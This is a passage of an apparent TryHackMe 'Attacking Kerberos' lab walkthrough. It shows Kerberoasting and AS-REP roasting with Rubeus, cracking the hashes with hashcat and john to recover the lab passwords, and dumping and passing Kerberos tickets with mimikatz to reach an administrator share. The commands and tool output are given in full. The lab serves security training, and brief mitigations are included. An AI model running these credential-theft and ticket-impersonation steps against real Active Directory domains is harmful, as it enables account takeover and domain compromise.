$krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.local:30222*$56c0ab35b6e4de86205d5cc5acfeab32$51167ef5b76cd0554fcad5c7b37b575aa676385e80f49ee536aa658b3501a185b0fc9923a2f4f1546be3a6ac348a25b7b06055b180f1e26561a7e899317363512c01d5618bc34f2fdb50c74b559e8893d6e710c8604d5d21b1bac6b8203f085228bbc934373265a0589b88e94c8fd3bc22124725ff152753b298d931befe7deb85431eebd7b40a0f17528a2df9d0f8d06c053aed87fb17b9c0b3848c4e294490d70d0239ab08b1544dfacfe7c0d3a2232aac2513c65a7fc09ee4be454fb5edfcf01d660b6897876bef606913f732292122beffdcddbfe1db6507ac689b3a5711fcaf6467ee413b65d731f3bc50aced4d9da742cc82a07b3b704f84e5d7f2a48c96215976eaafa05b593377340179742ea1d2b991a1442269a247539e7e7af40e90e56346bf60a34d4bf0e63d445945bbff39110cb737b53b8688ac154b88cde3169d1ccc14b9886615c895e0349a760b6ac079a5188d8dcfcab6fad98567e5173452b5f55db62db5004d3c7665a3c3290bc92e0d66646dd99372483d275d77180a15b4edcd04929778b779f5f57cc0d5d72f2e585ded5b0b4973c65f3ff8eb6e67951215fb483d18ba35cecbb58d09bee973e29427a94efbbd38d8af293d5ec65d5ec771fe5a4179d7c9f68cac6d3870670caf734664a40ec25233de97efd8b2a8bb7df31b2a5c719c7743e708850f947eda87839c306ec44ff38dcac0f8ba45de2055e7e22ba8c5185cf1c1b0616a6f638a881347daf157b0263f4ad78169f535af93a04656ec8ce2034c8af46dc9376f3111ca2c3ec8b295c3675fa5384d081247d8919764478d422682acdf262cca375eafca369a23f340895c435cc8f8c24bc738cdea594e637c4669e4c233dd45d7e105e33692a77a0f1dd00e60ef70a81d24113170a4500a5275f3e6e7d204368611f54f3e1211ceb88fd4834f84b525987450afb2c9071afeeb64c82ce49ec60964c994521a8e7702e3a1133006fdf9b223176f24802ea85eb5ba2fb1a72ad999dc99b985b1866abd64eed25c3b7db073170912be246690783d6c66829ecbd32f519d00c10ee35957e360064512ef68bf27a22defae03048806f3b3bf2a62d5d8954b131de76e6e297c4f5700ddf25a305b7ebc28ba5bd4ca3e8cb95f1af119c531d1235a5006f33e190d759f4121dcfd6932020212b108a0ad7d7324a3ce18cd85699d68faa01520d00e1d007403c196b7927d07adae390258c4e7f1a27e2caa6e4861a4d1222b6ad1b9da85b9cca9ec46a3dccd96ad728e0214452a97b664eb62eb1bfa333e8d4b57eebc8b255de0d4d1474d30483e508ba82af8c711a285f6f34b7086f0dea8b8d6cc326745fe69e2a26f31b0122ecaffef7a1f3f884e7926eb77d3633c892a4b0335920c47c2b8f050aa1d70f35aab947d8a480f75851f04f51362837ba6b7491ea78acc24d7cccc13c8c1d3c7b1d4b821c2c93a4c1161588bccf8a783fec9afe09921efcc687cb2d9f266a7c1b593381fd1bfdd43487c8404444f862c56e147bbe2a65eb92206d9d4ceb1b9b706ed0b60dc8c643ac11985838598605e77301883f18b3be2b882eed3a3fa59a7cc7df81c8012bd3213439e2f25cff609f05c066241772eb691e65a8c55d3be0d8c6e5e6582d2f532b818:Summer2020
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLE...32b818
Time.Started.....: Thu Apr 30 12:32:15 2026 (0 secs)
Time.Estimated...: Thu Apr 30 12:32:15 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (Pass.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   119.2 kH/s (0.75ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1240/1240 (100.00%)
Rejected.........: 0/1240 (0.00%)
Restore.Point....: 0/1240 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> hello123
Hardware.Mon.#1..: Util:  8%

Started: Thu Apr 30 12:32:05 2026
Stopped: Thu Apr 30 12:32:17 2026
```

Answer: `Summer2020`

#### What is the SQLService Password?

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Attacking_Kerberos]
└─$ hashcat -m 13100 kerberoast_sql.txt Pass.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-Intel(R) Core(TM) i7-4790 CPU @ 3.60GHz, 2913/5890 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: Pass.txt
* Passwords.: 1240
* Bytes.....: 9706
* Keyspace..: 1240

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

$krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.local:30111*$3aa50d3a331758b4e4b917e43e955975$e557cdd1dc17054221021beb0fb4edda30ff989fe2f0e044d443a940143c308e55d5505e6ebea8959303cb706472790cf68009a281656764489d82ebba4d6108d45189c7a19f3bf8aab81060f5c28080606a1eaa7a569ded5cb2c2a566eb801d86ef7e7fa281ffd9376394e801a5966185e4af4a4312a6c466b864efbed77d28b72a1adbc5040b1952e8093f8f9bcdd443e02e71dc62a23808d61b55e89cd7fe9437ccbaa5338060215230c91c6c96dda3d9b7cb1840b7a3a661872152a0688d2a44f8157393cf5b14c401e3ec2a39d0a39184ec413824beaca54f29eded605dc2e47ff2b9411c24805942ae459a0b0ece0b3cd46b4d56b67b2d518c9822bba49fd42fc3e3c21131d788534aa1feb466ebf74b94a53c60479756076ca07f87a2e63b25c22a9b07527d8aff7949957eb75e747d5ddd31a2ac3ca6a2c7688aeec1f67fd37842aada48f775dc22fb22c388454b626b13bc73e50ba9b6b73c5f644efd8811b8971f7259158b9db9abc1f924cfdb682b38f8e674a62beb9a2072d89473cee746465a994a8ce0bfa85e1743b0138e2c7fcc5947abccd6f790193e6cd87750356a6b678703a773d940eb8da61b9a9d69e877bfaff9fc7db0ce5955ad0dd59d408463e4c256afe64728058efad82026d3a806a0e7aa802df87f8de1e0dfa580a7566d4da1a0cb50df5210f8fbfc210ff7f981cf93dd65ac5c0014664a79eda8a4d56c633ea2b01324c02cb566745a5ab5e182defb33909d68e246e07bfcbce4688d5800206dad2a578f88240a680bf5f44dc5abe8bab9346befea5d7919c541b05e2b3488266c07d7981b8dc34742f9fd075428353859db882762e271c1bbf66d2a380de74dc504da33c579d1dd811c4c5fcd659169367830bd25452cf295b7f536df6ea80e291bf3e3d9da66d3037f45f3d506084cd341edda218d48fd41b075e815314de923315f0832d9630c3d4469192d21461054339ba37c4d6849f6c65e76f38e73ae7bb6c64d12191fb715006468f946def740fed071e294bbaf19e656479661b1290c77d8c8f9fef75771e28a3f768c022fa707af17e66a40f18d30cc616c932c46f4da9fafd3c3368505a231bd6eb04b8dd2fec6b2c1374ca9180efbf1acbf1a36932e48b33598230b5a30f90cc2e5878dea81cb2bc25c74ad1998122268041f0ae015a2a6fd2c16fce5862410dec78150558df745093f89d52821fbbc70fa99652dafdee4c653f7309ad088b169277c9084841481f8c1d4dc0f4fd8822b1a0b565aa54f5813a9c1c42033bdbdbfd76c1f3375f230008832ab9e7223b76106d03bfd66d3ee1e630f1a21da8b141f1a9566149c3f46b8a27d3c4eefbe28d70e77786e02cdcb71d9cb2ff3fd4502ead453e617d9524a99c2fb8c87e53cd049c62f35f985a5b631df49cb4f7480edc26287f7ec071f558b54f4bc34cc9d36bff571f5c34737082a46e6845f338a41264fdbd25cd20cadc8b79a032e9f444606487417255236c90de9493de2ffbe0fcee3ada0c6c8ee14c5cba3f59c485b5688f926cce41b533bdd0a719e64456ddd759ef63e02e3daa9fcc573ab9bde853e8db9902c25c8fc375d1f08797969688b50edd816dd56a8083e1c2fe8bb172533b623d721a7a7f18d1d51390e:MYPassword123#
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER...51390e
Time.Started.....: Thu Apr 30 12:34:23 2026 (0 secs)
Time.Estimated...: Thu Apr 30 12:34:23 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (Pass.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   514.9 kH/s (0.49ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1240/1240 (100.00%)
Rejected.........: 0/1240 (0.00%)
Restore.Point....: 0/1240 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> hello123
Hardware.Mon.#1..: Util: 14%

Started: Thu Apr 30 12:34:22 2026
Stopped: Thu Apr 30 12:34:26 2026
```

Answer: `MYPassword123#`

---------------------------------------------------------------------------

### Task 5: AS-REP Roasting w/ Rubeus

Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.

We'll continue using Rubeus same as we have with kerberoasting and harvesting since Rubeus has a very simple and easy to understand command to AS-REP roast and attack users with Kerberos pre-authentication disabled. After dumping the hash from Rubeus we'll use hashcat in order to crack the krbasrep5 hash.

There are other tools out as well for AS-REP Roasting such as **kekeo** and Impacket's **GetNPUsers.py**. Rubeus is easier to use because it automatically finds AS-REP Roastable users whereas with GetNPUsers you have to enumerate the users beforehand and know which users may be AS-REP Roastable.

I have already compiled and put Rubeus on the machine.

#### AS-REP Roasting Overview

During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.

![AS-REP Roasting](Images/AS-REP_Roasting.png)

#### Dumping KRBASREP5 Hashes w/ Rubeus

1. `cd Downloads` - navigate to the directory Rubeus is in

2. `Rubeus.exe asreproast` - This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.

![Rubeus AS-REP Roasting](Images/Rubeus_AS-REP_Roasting.png)

#### Crack those Hashes w/ hashcat

1. Transfer the hash from the target machine over to your attacker machine and put the hash into a txt file

2. Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....

Use the same wordlist that you downloaded in task 4

3. `hashcat -m 18200 hash.txt Pass.txt` - crack those hashes! Rubeus AS-REP Roasting uses hashcat mode **18200**

![Cracking AS-REP Hashes](Images/Cracking_AS-REP_Hashes.png)

#### AS-REP Roasting Mitigations

- Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective
- Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.

---------------------------------------------------------------------------

#### What hash type does AS-REP Roasting use?

Answer: `Kerberos 5 AS-REP etype 23`

#### Which User is vulnerable to AS-REP Roasting?

```bash
C:\Users\Administrator\Downloads>Rubeus.exe asreproast /outfile:asrep_hashes.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: AS-REP roasting

[*] Target Domain          : CONTROLLER.local

[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users
[*] SamAccountName         : Admin2
[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::45e5:89b8:cf0f:332d%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
[+] AS-REQ w/o preauth successful!
[*] Hash written to C:\Users\Administrator\Downloads\asrep_hashes.txt

[*] SamAccountName         : User3
[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::45e5:89b8:cf0f:332d%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3'
[+] AS-REQ w/o preauth successful!
[*] Hash written to C:\Users\Administrator\Downloads\asrep_hashes.txt

[*] Roasted hashes written to : C:\Users\Administrator\Downloads\asrep_hashes.txt

C:\Users\Administrator\Downloads>
```

Answer: `User3`

#### What is the User's Password?

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Attacking_Kerberos]
└─$ vi asrep_user3.txt    

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Attacking_Kerberos]
└─$ cat asrep_user3.txt  
$krb5asrep$User3@CONTROLLER.local:9921B23F5F550F5AB731A6458F87ABB3$AC4681D7FFDB903277977241963F421F6662BFFFABC635D95B676FB3668198E65453AEB42F951F6BD8297DF0C19FA922AB7112CE97153C1111C8D4FEDB9DD35C60C98EF26D98E9E4EE85BB0D5F28E12498F5BF8C63AE394082787F16EFD4161739A02C187A0F89445410BC05F931CCEC8C144B93E5E9A82D08F29D04075C09EA3221AF19DF8F74FC25AE1DA67F43C8DC8808F2308ED051E1CE52ED0B2A2479DF7C307DC8F35A8661B7BA48CA7FBA2A42EF269591D9E44CB19E503A52499039067C909502F3A4FAE59474C6AC2A00BE5BA84625F9CA76666F5D6DB76EE94BE627D8A52763FE38F6D8BF4238FFA8ABF7BC789C52B0

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Attacking_Kerberos]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt asrep_user3.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password3        ($krb5asrep$User3@CONTROLLER.local)     
1g 0:00:00:00 DONE (2026-04-30 12:58) 3.571g/s 512000p/s 512000c/s 512000C/s albarran..260408
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Answer: `Password3`

#### Which Admin is vulnerable to AS-REP Roasting?

```bash
<---snip--->
[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users
[*] SamAccountName         : Admin2
[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::45e5:89b8:cf0f:332d%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
[+] AS-REQ w/o preauth successful!
[*] Hash written to C:\Users\Administrator\Downloads\asrep_hashes.txt
<---snip--->
```

Answer: `Admin2`

#### What is the Admin's Password?

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Attacking_Kerberos]
└─$ vi asrep_admin2.txt                                             

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Attacking_Kerberos]
└─$ cat asrep_admin2.txt                                                                                                     
$krb5asrep$Admin2@CONTROLLER.local:D43E534D63E5E3AEF2CEF8E3A4E82C07$6C4421873663735D27D2BCB1D10F37A343225954BC95836C7C6C790442759DE97FC9C6A7D2057DE24AF8F7BD4811B48FFDCFC39832153EC4A21D19152FE6663DA4511468685E0AB9CAA83CCDAF2E32EE4481DD54FEFAA86C36F45D834E7F3205A0255C941470563A528486C8EAA122608EE264B1DA619A10A56F6128D02ED164A1C8C7ECA12136C137AC099461395143F33CF5DD735FEE816FEE6FF3B8560188DC79ADD3C0DBF2ED6451A20446B1D6219CADC04AA023DE72B21D44C228539D2ACC537118DE762A3CB2DC18712A7AA013533351633A7ACD4499D36B82BEAE590FA22AD2F9C07DE85DF46DDA263BE3FFEB7217DE56

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Attacking_Kerberos]
└─$ john --wordlist=Pass.txt asrep_admin2.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P@$$W0rd2        ($krb5asrep$Admin2@CONTROLLER.local)     
1g 0:00:00:00 DONE (2026-04-30 13:01) 100.0g/s 102400p/s 102400c/s 102400C/s 123456..moomoo
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Answer: `P@$$W0rd2`

---------------------------------------------------------------------------

### Task 6: Pass the Ticket w/ Mimikatz

Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however we'll be using mimikatz in order to dump a TGT from LSASS memory

This will only be an overview of how the pass the ticket attacks work as THM does not currently support networks but I challenge you to configure this on your own network.

You can run this attack on the given machine however you will be escalating from a domain admin to a domain admin because of the way the domain controller is set up.

#### Pass the Ticket Overview

Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory.

This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.

![Pass the Ticket](Images/Pass_the_Ticket.png)

#### Prepare Mimikatz & Dump Tickets

You will need to run the command prompt **as an administrator**: use the same credentials as you did to get into the machine. If you don't have an elevated command prompt mimikatz will not work properly.

1. `cd Downloads` - navigate to the directory mimikatz is in

2. `mimikatz.exe` - run mimikatz

3. `privilege::debug` - Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz

![Mimikatz PtT 1](Images/Mimikatz_PtT_1.png)

4. `sekurlsa::tickets /export` - this will export all of the .kirbi tickets into the directory that you are currently in

At this step you can also use the base 64 encoded tickets from Rubeus that we harvested earlier

![Mimikatz PtT 2](Images/Mimikatz_PtT_2.png)

When looking for which ticket to impersonate I would recommend looking for an administrator ticket from the krbtgt just like the one outlined in red above.

```bat
C:\Users\Administrator\Downloads>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export

Authentication Id : 0 ; 3406968 (00000000:0033fc78)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : CONTROLLER
Logon Server      : CONTROLLER-1
Logon Time        : 4/30/2026 2:26:33 AM
SID               : S-1-5-21-432953485-3795405108-1502158860-500

         * Username : Administrator
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 4/30/2026 3:25:25 AM ; 4/30/2026 12:26:33 PM ; 5/7/2026 2:26:33 AM
           Service Name (02) : CONTROLLER-1 ; HTTPService.CONTROLLER.local:30222 ; @ CONTROLLER.LOCAL
           Target Name  (02) : CONTROLLER-1 ; HTTPService.CONTROLLER.local:30222 ; @ CONTROLLER.LOCAL
           Client Name  (01) : Administrator ; @ CONTROLLER.LOCAL
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000017 - rc4_hmac_nt
             2e863ea5d339bd64a2d5c18f78ebf942
           Ticket            : 0x00000017 - rc4_hmac_nt       ; kvno = 2        [...]
           * Saved to file [0;33fc78]-0-0-40a10000-Administrator@CONTROLLER-1-HTTPService.CONTROLLER.local~30222.kirbi !
         [00000001]
           Start/End/MaxRenew: 4/30/2026 3:25:25 AM ; 4/30/2026 12:26:33 PM ; 5/7/2026 2:26:33 AM
           Service Name (02) : CONTROLLER-1 ; SQLService.CONTROLLER.local:30111 ; @ CONTROLLER.LOCAL
           Target Name  (02) : CONTROLLER-1 ; SQLService.CONTROLLER.local:30111 ; @ CONTROLLER.LOCAL
           Client Name  (01) : Administrator ; @ CONTROLLER.LOCAL
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000017 - rc4_hmac_nt
             29fe8d2da13182d46a1c1e545dfbc945
           Ticket            : 0x00000017 - rc4_hmac_nt       ; kvno = 2        [...]
           * Saved to file [0;33fc78]-0-1-40a10000-Administrator@CONTROLLER-1-SQLService.CONTROLLER.local~30111.kirbi !

<---snip--->

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 4/30/2026 1:46:56 AM ; 4/30/2026 11:46:56 AM ; 5/7/2026 1:46:56 AM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( $$Delegation Ticket$$ )
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             44b11785debc331200c6b8760cc9b991a8f0cf5105a688e00205b1501cd05358
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e7]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !
         [00000001]
           Start/End/MaxRenew: 4/30/2026 1:46:56 AM ; 4/30/2026 11:46:56 AM ; 5/7/2026 1:46:56 AM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             c8845d44bcbe94676ee1f3ce91e072b5205cc298028d1d646b98976f632b54b2
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e7]-2-1-40e10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !

mimikatz #
```

#### Pass the Ticket w/ Mimikatz

Now that we have our ticket ready we can now perform a pass the ticket attack to gain domain admin privileges.

1. `kerberos::ptt <ticket>` - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket

![Mimikatz PtT 3](Images/Mimikatz_PtT_3.png)

```bat
mimikatz # kerberos::ptt [0;33fc78]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi

* File: '[0;33fc78]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi': OK

mimikatz #
```

2. `klist` - Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.

We will not be using mimikatz for the rest of the attack.

![Mimikatz PtT 4](Images/Mimikatz_PtT_4.png)

3. You now have impersonated the ticket giving you the same rights as the TGT you're impersonating. To verify this we can look at the admin share.

![Mimikatz PtT 5](Images/Mimikatz_PtT_5.png)

```bat
C:\Users\Administrator> klist

Current LogonId is 0:0x33fc78

Cached Tickets: (3)

#0>     Client: Administrator @ CONTROLLER.LOCAL
        Server: krbtgt/CONTROLLER.LOCAL @ CONTROLLER.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/30/2026 2:26:33 (local)
        End Time:   4/30/2026 12:26:33 (local)
        Renew Time: 5/7/2026 2:26:33 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

#1>     Client: Administrator @ CONTROLLER.LOCAL
        Server: CONTROLLER-1/HTTPService.CONTROLLER.local:30222 @ CONTROLLER.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 4/30/2026 3:25:25 (local)
        End Time:   4/30/2026 12:26:33 (local)
        Renew Time: 5/7/2026 2:26:33 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: CONTROLLER-1

#2>     Client: Administrator @ CONTROLLER.LOCAL
        Server: CONTROLLER-1/SQLService.CONTROLLER.local:30111 @ CONTROLLER.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 4/30/2026 3:25:25 (local)
        End Time:   4/30/2026 12:26:33 (local)
        Renew Time: 5/7/2026 2:26:33 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: CONTROLLER-1

C:\Users\Administrator> dir \\10.112.191.62\ADMIN$
 Volume in drive \\10.112.191.62\ADMIN$ has no label.
 Volume Serial Number is E203-08FF

 Directory of \\10.112.191.62\ADMIN$

01/03/2021  08:36 AM    <DIR>          .
01/03/2021  08:36 AM    <DIR>          ..
09/15/2018  12:19 AM    <DIR>          ADFS
05/25/2020  02:58 PM    <DIR>          ADWS
09/15/2018  12:19 AM    <DIR>          appcompat
09/06/2019  05:31 PM    <DIR>          apppatch
05/25/2020  02:55 PM    <DIR>          AppReadiness
05/25/2020  03:41 PM    <DIR>          assembly
09/15/2018  12:19 AM    <DIR>          bcastdvr
09/15/2018  12:12 AM            78,848 bfsvc.exe
09/15/2018  12:19 AM    <DIR>          Boot
09/15/2018  12:19 AM    <DIR>          Branding
04/30/2026  01:47 AM    <DIR>          CbsTemp
09/15/2018  12:19 AM    <DIR>          Containers
09/15/2018  12:19 AM    <DIR>          Cursors
04/30/2026  01:46 AM    <DIR>          debug
09/06/2019  05:28 PM           232,960 DfsrAdmin.exe
09/06/2019  05:30 PM             1,315 DfsrAdmin.exe.config
09/15/2018  12:19 AM    <DIR>          diagnostics
09/15/2018  02:08 AM    <DIR>          DigitalLocker
09/15/2018  12:19 AM    <DIR>          drivers
05/25/2020  12:18 PM             1,947 DtcInstall.log
09/15/2018  02:08 AM    <DIR>          en-US
09/06/2019  05:28 PM         4,353,016 explorer.exe
09/15/2018  12:19 AM    <DIR>          Globalization
09/15/2018  02:08 AM    <DIR>          Help
09/06/2019  05:29 PM         1,071,616 HelpPane.exe
09/15/2018  12:12 AM            18,432 hh.exe
09/15/2018  12:19 AM    <DIR>          IdentityCRL
09/15/2018  02:08 AM    <DIR>          IME
05/25/2020  12:18 PM    <DIR>          ImmersiveControlPanel
04/30/2026  01:50 AM    <DIR>          INF
09/15/2018  12:19 AM    <DIR>          InputMethod
09/15/2018  12:19 AM    <DIR>          L2Schemas
09/15/2018  12:19 AM    <DIR>          LiveKernelReports
04/30/2026  03:52 AM    <DIR>          Logs
05/25/2020  12:17 PM             1,378 lsasetup.log
09/15/2018  12:12 AM            43,131 mib.bin
04/30/2026  02:03 AM    <DIR>          Microsoft.NET
09/15/2018  12:19 AM    <DIR>          Migration
09/15/2018  12:19 AM    <DIR>          ModemLogs
09/06/2019  05:29 PM           254,464 notepad.exe
04/30/2026  01:46 AM    <DIR>          NTDS
09/15/2018  02:09 AM    <DIR>          OCR
09/15/2018  12:19 AM    <DIR>          Offline Web Pages
05/25/2020  12:18 PM    <DIR>          Panther
09/15/2018  12:19 AM    <DIR>          Performance
04/30/2026  01:45 AM             6,372 PFRO.log
09/15/2018  12:19 AM    <DIR>          PLA
09/06/2019  05:31 PM    <DIR>          PolicyDefinitions
05/25/2020  12:17 PM    <DIR>          Prefetch
05/25/2020  12:18 PM    <DIR>          PrintDialog
09/15/2018  12:19 AM    <DIR>          Provisioning
05/25/2020  05:29 PM            87,616 PSSDNSVC.EXE
09/06/2019  05:29 PM           358,400 regedit.exe
